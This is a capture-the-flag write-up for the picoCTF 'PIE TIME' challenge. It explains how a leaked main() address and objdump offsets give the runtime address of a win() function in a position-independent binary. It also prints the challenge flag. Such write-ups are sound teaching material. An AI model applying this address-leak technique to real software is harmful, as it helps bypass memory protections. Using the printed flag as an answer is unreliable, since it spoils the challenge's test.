# **Question : PIE TIME **

## **Introduction**
This guide walks through how to exploit a **Position Independent Executable (PIE)** binary where we need to compute a function's address dynamically before redirecting execution to it.

---

## **Understanding the Challenge**
When we connect to the challenge server using `nc`, we receive the following output:

```bash
$ nc rescued-float.picoctf.net 58566
Address of main: 0x5d06e816d33d
Enter the address to jump to, ex => 0x12345:
```

This tells us:
1. The program **leaks the runtime address of `main()`**.
2. It allows us to **enter an address to jump to**.
3. The binary is **PIE-enabled**, meaning function addresses change on every execution.

---

## **Step 1: Identifying Our Goal**
Using `objdump`, we search for a function named `win()`:

```bash
objdump -d vuln | grep win
```

### **Output:**
```
00000000000012a7 <win>:
```
This means:
- `win()` exists at an **offset of `0x12a7`** within the binary.
- Our goal is to **redirect execution to `win()`**.

---

## **Step 2: Finding the Offset of `main()`**
Similarly, we retrieve `main()`'s offset:

```bash
objdump -d vuln | grep main
```

### **Output:**
```
000000000000133d <main>:
```
This tells us that `main()` is located at **offset `0x133d`** within the binary.

---

## **Step 3: Understanding PIE & Address Calculation**
Since the binary is **PIE-enabled**, its **base address changes** on every execution. However, function offsets **remain the same**.

Using the **leaked runtime address of `main()`**, we calculate `win()`'s actual address:

### **Formula:**
```
win_runtime = leaked_main + (win_offset - main_offset)
```

### **Example Calculation:**
Given:
- **Leaked `main()` Address:** `0x5d06e816d33d`
- **`win()` Offset:** `0x12a7`
- **`main()` Offset:** `0x133d`

Using Python:
```python
leaked_main = 0x5d06e816d33d  # Given at runtime
win_offset = 0x12a7
main_offset = 0x133d

win_runtime = leaked_main + (win_offset - main_offset)
print(hex(win_runtime))
```

### **Output:**
```
0x5d06e816d2a7
```

Now we have the **correct runtime address of `win()`**.

---

## **Step 4: Redirecting Execution**
When prompted:
```
Enter the address to jump to, ex => 0x12345:
```
We input:
```
0x5d06e816d2a7
```

This successfully jumps to `win()`, and we receive:
```
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_378c1259}
```

---

## **Summary of Commands Used**
| **Command** | **Purpose** |
|------------|------------|
| `objdump -d vuln | grep win` | Finds the offset of `win()` |
| `objdump -d vuln | grep main` | Finds the offset of `main()` |
| `python3 -c 'print(hex(leaked_main + (win_offset - main_offset)))'` | Computes `win()`'s real address |

---

## **Key Takeaways**
✅ **PIE randomizes addresses, but offsets remain the same.**  
✅ **Leaked addresses can help compute runtime addresses dynamically.**  
✅ **We used `objdump` to extract function offsets.**  
✅ **Redirecting execution to `win()` resulted in a successful exploit.**  

---

